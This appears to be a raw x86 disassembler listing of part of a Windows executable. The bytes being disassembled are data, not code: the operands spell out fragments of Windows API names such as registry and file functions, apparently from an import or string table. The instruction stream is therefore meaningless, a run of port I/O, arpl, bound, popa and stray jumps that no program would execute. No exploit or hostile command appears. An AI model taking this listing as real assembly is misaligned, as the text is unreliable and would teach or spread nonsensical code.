  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
